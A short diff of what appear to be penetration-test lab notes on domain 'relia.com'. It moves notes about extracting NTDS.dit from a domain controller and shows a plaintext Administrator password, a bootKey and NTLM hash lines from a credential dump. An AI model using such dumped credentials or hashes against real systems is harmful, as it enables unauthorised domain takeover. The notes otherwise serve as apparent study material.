@@ -1,14 +1,12 @@
 We are already administrator using these creds:
 
-
-We will extract NTDS.dit.
-Extracted info:
-
-Internal admin is the the administrator of all DC chain:
-relia.com\internaladmin:65a883e27cc4714738dfe4dce95001db
 ```sh
 Administrator:vau!XCKjNQBv2$
 ```
+
+
+We will extract NTDS.dit.
+Extracted info:
 
 ```sh
 [*] Target system bootKey: 0x5134f539f916174432bd178912ae1162
@@ -49,3 +47,6 @@ WEBBY$:1127:aad3b435b51404eeaad3b435b51404ee:f378514d1e5e428da3303a1fe36e7696:::
 
 
 ```
+
+Internal admin is the the administrator of all DC chain:
+relia.com\internaladmin:65a883e27cc4714738dfe4dce95001db
